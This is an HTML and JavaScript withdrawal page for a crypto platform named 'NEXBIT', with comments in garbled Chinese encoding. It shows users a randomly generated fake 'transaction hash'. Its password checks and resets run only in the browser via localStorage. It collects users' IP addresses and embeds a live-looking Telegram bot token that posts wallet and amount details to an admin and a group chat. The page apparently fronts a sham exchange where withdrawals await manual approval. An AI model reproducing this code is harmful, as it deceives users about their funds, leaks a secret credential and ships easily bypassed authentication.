<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>NEXBIT Withdraw</title>

<style>
  * { box-sizing: border-box; }
  body { background-color: transparent; font-family: Arial, sans-serif; margin:0; padding:0; width:100%; overflow-x:hidden; }
  .withdraw-box { width:100%; max-width:450px; margin:30px auto; padding:25px; border-radius:12px; background:transparent!important; color:white; }
  select,input,button { width:100%; max-width:100%; padding:12px; margin-top:8px; border-radius:6px; border:1px solid rgba(255,255,255,0.6); background:transparent!important; color:white; font-size:15px; display:block; }
  select option { color:black; }
  button { cursor:pointer; font-weight:bold; border:none; background:#0099cc; }
  button:disabled { background:#444!important; cursor:not-allowed!important; }
  .row { display:flex; justify-content:space-between; gap:10px; width:100%; }
  #copyHashBtn,#submitBtn { display:none; width:48%; }
  #usdtText { text-align:right; color:#00ff00; font-size:13px; }
  #hashBox { color:#00ff00; margin-top:10px; white-space:pre-line; font-size:14px; overflow-wrap:break-word; }
</style>
</head>

<body>
<div class="withdraw-box">
  <h2 style="text-align:center;"></h2>

  <label>Select Cryptocurrency</label>
  <select id="coin" onchange="updateUSDT()">
    <option value="BTC">BTC</option>
    <option value="ETH">ETH</option>
    <option value="USDT">USDT</option>
    <option value="BNB">BNB</option>
    <option value="XRP">XRP</option>
    <option value="ADA">ADA</option>
    <option value="SOL">SOL</option>
    <option value="DOGE">DOGE</option>
    <option value="TRX">TRX</option>
  </select>

  <label>Enter Coin Amount</label>
  <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
  <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>

  <label>Password</label>
  <input type="password" id="password" placeholder="Enter password" />

  <div class="row">
    <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
    <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
  </div>

  <button onclick="forgotPassword()">Forgot Password?</button>
   <!-- Reset Withdraw Password Box -->
<div id="resetBox" style="display:none;margin-top:15px;border-top:1px dashed rgba(255,255,255,.4);padding-top:15px;">

  <!-- Old Password OR Used Wallet (side by side) -->
<div style="display:flex;gap:10px;flex-wrap:wrap;">

  <div style="flex:1;min-width:150px;">
    <label>Old Password</label>
    <input type="password" id="oldPwd" placeholder="Old withdraw password" />
  </div>

  <div style="flex:1;min-width:150px;">
    <label>Used Wallet</label>
    <input id="verifyWallet" placeholder="Used withdraw wallet" />
  </div>
<div style="margin-top:6px;font-size:12px;color:#999;text-align:center;">
  ğŸ¤– Enter enther the old withdraw password OR a previously used withdrawal wallet address to reset your withdraw password.
</div>
</div>

  <label>New Withdraw Password</label>
  <input type="password" id="newPwd" placeholder="Set new withdraw password" />

  <button onclick="resetWithdrawPassword()">Reset Withdraw Password</button>

</div>

  <label>Wallet Address</label>
  <input id="wallet" placeholder="Paste wallet address" />
  <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>

  <div id="hashBox"></div>

  <div class="row">
    <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
    <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
  </div>
</div>
<!-- Withdrawal History Toggle -->
<button onclick="showWithdrawHistory()"
        style="margin-top:12px;background:#333;">
  ğŸ“¥ View Withdrawal Records
</button>

<!-- Withdrawal History Box -->
<div id="historyBox"
     style="display:none;margin-top:10px;
            border-top:1px dashed rgba(255,255,255,.3);
            padding-top:10px;font-size:13px;
            color:#fff;">
</div>

<script>
/************************************
 * NEXBIT â€” ç‹¬ç«‹ UIDï¼ˆå…¨ç«™ç»Ÿä¸€ï¼‰
 ************************************/
if(!localStorage.getItem("nexbit_uid")) {
    localStorage.setItem("nexbit_uid", "U" + Date.now() + "_" + Math.floor(Math.random()*999999));
}
const USERID = localStorage.getItem("nexbit_uid");

/************************************
 * åç«¯é…ç½®
 ************************************/
const API = "https://crypto-management-production-5e04.up.railway.app";
const BOT_TOKEN = "8228143745:AAGsaA043ZDQyXt8szfBnr0LpmrMl5ILvRs";
const ADMIN_ID = "6062973135";
const GROUP_ID = "-1003122480155";

/************************************
 * é˜²æ­¢é‡å¤æäº¤
 ************************************/
let submitting = false;

/************************************
 * æ—¶é—´æ ¼å¼
 ************************************/
function usTime(){
  return new Date().toISOString();
}

/************************************
 * Binance WS ä»·æ ¼
 ************************************/
let currentPrice = 0;
let ws;

function connectWS(symbol){
  if(ws){ ws.close(); }
  if(symbol==="USDT"){ currentPrice = 1; updateUSDT(); return; }

  ws = new WebSocket("wss://stream.binance.com:9443/ws/" + symbol.toLowerCase() + "usdt@ticker");
  ws.onmessage = e => {
    let d = JSON.parse(e.data);
    currentPrice = parseFloat(d.c);
    updateUSDT();
  };
}

document.getElementById("coin").addEventListener("change", () => {
  connectWS(document.getElementById("coin").value);
});
connectWS(document.getElementById("coin").value);

/************************************
 * å¯†ç é€»è¾‘
 ************************************/
let storedPassword = localStorage.getItem("withdraw_password");
let passwordConfirmed = false;

if(storedPassword) document.getElementById("createPwdBtn").style.display = "none";

function createPassword(){
  if(storedPassword) return alert("Password already created.");
  storedPassword = Math.random().toString(36).substr(2,6).toUpperCase();
  localStorage.setItem("withdraw_password", storedPassword);
  alert("Your Password: " + storedPassword);
  document.getElementById("createPwdBtn").style.display = "none";
}

function confirmPassword(){
  if(document.getElementById("password").value === storedPassword){
    passwordConfirmed = true;
    alert("Password confirmed!");
  } else alert("Wrong password!");
}

function forgotPassword(){
  document.getElementById("resetBox").style.display = "block";
}


/************************************
 * é’±åŒ…é€»è¾‘
 ************************************/
let txHash = "";

function confirmWallet(){
  if(!passwordConfirmed) return alert("Confirm password first.");

  let wallet = document.getElementById("wallet").value.trim();
  if(!wallet) return alert("Enter wallet address.");

  txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase();
  document.getElementById("hashBox").innerText = "Hash:\n" + txHash;
   // âœ…ã€å°±åœ¨è¿™é‡Œã€‘è®°å½•å·²æˆåŠŸä½¿ç”¨è¿‡çš„é’±åŒ…åœ°å€
  document.getElementById("copyHashBtn").style.display = "block";
  document.getElementById("submitBtn").style.display = "block";
  document.getElementById("submitBtn").disabled = false;

  document.getElementById("walletBtn").disabled = true;
}

function copyHash(){
  navigator.clipboard.writeText(txHash);
  alert("Copied");
}

/************************************
 * USDT è‡ªåŠ¨è®¡ç®—
 ************************************/
function updateUSDT(){
  let amount = parseFloat(document.getElementById("amount").value || 0);
  let val = amount * currentPrice;
  document.getElementById("usdtValue").innerText = isNaN(val) ? "0" : val.toFixed(6);
}

/************************************
 * Telegram é€šçŸ¥
 ************************************/
function sendTG(text){
  let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ chat_id: ADMIN_ID, text })
  }).catch(()=>{});

  fetch(url, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ chat_id: GROUP_ID, text })
  }).catch(()=>{});
}

/************************************
 * ææ¬¾æäº¤
 ************************************/
async function submitWithdrawal(){
  if(submitting) return;
  submitting = true;

  const btn = document.getElementById("submitBtn");
  btn.disabled = true;
  btn.innerText = "Submitting...";

  let coin = document.getElementById("coin").value;
  let amount = parseFloat(document.getElementById("amount").value);
  let wallet = document.getElementById("wallet").value.trim();
  let estimate = parseFloat(document.getElementById("usdtValue").innerText);

  if(!amount || amount <= 0){
    alert("Please enter a valid withdrawal amount");
    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
    return;
  }
  if(!wallet){
    alert("Please enter your wallet address.");
    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
    return;
  }

  let orderId = "WDL-" + Date.now();
  let time = usTime();

  let ip = "0.0.0.0";
  try {
    let r = await fetch("https://api.ipify.org?format=json");
    ip = (await r.json()).ip;
  } catch(e){}

  const payload = {
    orderId,
    userId: USERID,
    time_us: time,
    type: "withdraw",
    amount,
    coin,
    estimate,
    wallet,
    ip,
    tp: null,
    sl: null,
    status: "pending"
  };

  try {
    const res = await fetch(API + "/api/order/withdraw", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-User-Id": USERID
      },
      body: JSON.stringify(payload)
    });

    const txt = await res.text();

    if (!res.ok) {
      if (txt.includes("ä½™é¢ä¸è¶³")) alert("ğŸ¤–Insufficient balance!");
      else alert("Submission failed: " + txt);
      submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
      return;
    }

    console.log("Withdraw success:", txt);

  } catch(e){
    alert("ğŸ¤–Submission failed, please try again.");
    submitting = false; btn.disabled = false; btn.innerText = "Submit Withdrawal";
    return;
  }

  sendTG(
    `ğŸ“¤ Withdrawal Request\nUser: ${USERID}\nOrder: ${orderId}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${estimate}\nWallet: ${wallet}\nTime (US): ${time}`
  );

  alert("ğŸ¤–Withdrawal Request Submitted!");
/* ğŸ“œ ä¿å­˜ææ¬¾å†å²ï¼ˆç»™ç”¨æˆ·æŸ¥çœ‹ï¼‰ */
let history = JSON.parse(localStorage.getItem("withdraw_history") || "[]");

history.unshift({
  orderId,
  time,
  coin,
  amount,
  wallet,
  estimate,
  status: "pending"
});

localStorage.setItem("withdraw_history", JSON.stringify(history));

  btn.innerText = "Submitted";
  submitting = false;
}
function resetWithdrawPassword(){
/* ğŸ”‘ æ¯å¤©ä»…å…è®¸ä¸€æ¬¡é‡ç½® */
  const today = new Date().toISOString().slice(0,10); // YYYY-MM-DD
  const resetKey = "withdraw_reset_" + USERID;
  const lastReset = localStorage.getItem(resetKey);

  if(lastReset === today){
    alert("You can only reset withdraw password once per day");
    return;
  }

  const oldPwd = document.getElementById("oldPwd").value.trim();
  const verifyWallet = document.getElementById("verifyWallet").value.trim();
  const newPwd = document.getElementById("newPwd").value.trim();

  if(!newPwd){
    alert("Enter new withdraw password");
    return;
  }

  const storedPwd = localStorage.getItem("withdraw_password");
  const approvedWallets = JSON.parse(
  localStorage.getItem("approved_wallets") || "[]"
);


  let passed = false;

  if(oldPwd && oldPwd === storedPwd){
    passed = true;
  }

  if(!passed && verifyWallet && approvedWallets.includes(verifyWallet)){
  passed = true;
}


  if(!passed){
    alert("Verification failed");
    return;
  }
   localStorage.setItem("withdraw_password", newPwd);
localStorage.setItem(resetKey, today);
passwordConfirmed = true;
  alert("Withdraw password reset successfully");
  document.getElementById("resetBox").style.display = "none";
}
function todayKey(){
  const d = new Date();
  return d.getFullYear() + "-" + (d.getMonth()+1) + "-" + d.getDate();
}
/* ğŸ“œ æŸ¥çœ‹ææ¬¾å†å² */
function showWithdrawHistory(){
  const box = document.getElementById("historyBox");
  const list = JSON.parse(localStorage.getItem("withdraw_history") || "[]");

  if(list.length === 0){
    box.innerHTML = "No withdrawal history.";
  }else{
    box.innerHTML = list.map(o => `
      <div style="margin-bottom:10px;border-bottom:1px solid rgba(255,255,255,.2);padding-bottom:8px;">

        <!-- Wallet + Status (side by side) -->
        <div style="display:flex;justify-content:space-between;align-items:center;">
          <div style="font-size:12px;opacity:.7;max-width:70%;overflow:hidden;text-overflow:ellipsis;">
            ${o.wallet}
          </div>
          <div style="font-size:12px;font-weight:bold;
            color:${o.status === 'approved' ? '#00ff88' :
                   o.status === 'rejected' ? '#ff6666' : '#ffaa00'}">
            ${o.status.toUpperCase()}
          </div>
        </div>

        <!-- Detail -->
        <div style="font-size:13px;margin-top:4px;">
          ${o.coin} ${o.amount} â‰ˆ ${o.estimate} USDT
        </div>
        <div style="font-size:11px;opacity:.6;">
          ${o.time}
        </div>

      </div>
    `).join("");
  }

  box.style.display = box.style.display === "none" ? "block" : "none";
}
/*************************************************
 * âœ… SSE è¿æ¥ + ææ¬¾çŠ¶æ€åŒæ­¥ + è‡ªåŠ¨æé†’ï¼ˆæœ€ç»ˆç‰ˆï¼‰
 *************************************************/

// â‘¡ å¤„ç†åå°æ¨é€çš„ update
function handleSSE(d){
  if(
    d.type === "update" &&
    d.order &&
    d.order.type === "withdraw"
  ){
    syncWithdrawStatus(d.order.orderId, d.order.status);
  }
}

// â‘¢ åŒæ­¥æœ¬åœ° withdrawal historyï¼ˆæ ¸å¿ƒï¼‰
function syncWithdrawStatus(orderId, newStatus){
  let history = JSON.parse(
    localStorage.getItem("withdraw_history") || "[]"
  );

  let changed = false;

  history.forEach(o => {
    if(o.orderId === orderId && o.status !== newStatus){
      o.status = newStatus;
      changed = true;

      // ğŸ” åªæœ‰å®¡æ‰¹æˆåŠŸçš„é’±åŒ…æ‰è®°å½•ä¸º Used Wallet
      if(newStatus === "approved"){
        let okWallets = JSON.parse(
          localStorage.getItem("approved_wallets") || "[]"
        );
        if(!okWallets.includes(o.wallet)){
          okWallets.push(o.wallet);
          localStorage.setItem(
            "approved_wallets",
            JSON.stringify(okWallets)
          );
        }
      }
    }
  });

  if(!changed) return;

  localStorage.setItem(
    "withdraw_history",
    JSON.stringify(history)
  );

  // â‘£ ğŸ”” è‡ªåŠ¨å¼¹çª—æé†’
  if(newStatus === "approved"){
    alert("âœ… Withdrawal Approved");
  }else if(newStatus === "rejected"){
    alert("âŒ Withdrawal Rejected");
  }

  // ğŸ”„ è‹¥å†å²æ¡†æ˜¯æ‰“å¼€çš„ï¼Œè‡ªåŠ¨åˆ·æ–°
  const box = document.getElementById("historyBox");
  if(box && box.style.display === "block"){
    showWithdrawHistory();
  }
}
/************************************
 * ğŸ”” SSE ç›‘å¬åå°å®¡æ‰¹ç»“æœï¼ˆå…³é”®ï¼‰
 ************************************/
const sse = new EventSource(
  API + "/wallet/" + USERID + "/sse"
);

sse.onmessage = function(ev){
  try{
    const data = JSON.parse(ev.data);

    // åªå¤„ç†è®¢å•æ›´æ–°
    if(data.type === "update" && data.order){
      const o = data.order;

      // åªåŒæ­¥ææ¬¾è®¢å•
      if(o.type === "withdraw" && o.orderId && o.status){
        syncWithdrawStatus(o.orderId, o.status);
      }
    }
  }catch(e){
    console.error("SSE parse error", e);
  }
};

sse.onerror = function(){
  console.warn("âš ï¸ SSE disconnected");
};

</script>

</body>
</html>
